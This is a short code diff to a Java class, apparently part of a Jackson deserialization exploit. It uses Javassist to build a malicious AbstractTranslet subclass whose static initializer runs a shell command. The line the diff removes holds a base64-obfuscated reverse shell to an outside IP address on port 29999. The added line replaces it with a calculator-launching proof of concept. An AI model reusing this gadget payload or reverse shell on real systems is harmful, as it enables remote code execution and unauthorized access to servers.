@@ -61,7 +61,7 @@ public class POJOJackson {
         ClassPool pool = ClassPool.getDefault();
         CtClass template = pool.makeClass("MyTemplate");
         template.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
-        String block = "Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMTMzLjE1NC4zLzI5OTk5IDA+JjE=}|{base64,-d}|{bash,-i}\");";
+        String block = "Runtime.getRuntime().exec(\"open -a Calculator\");";
         template.makeClassInitializer().insertBefore(block);
         return template.toBytecode();
     }
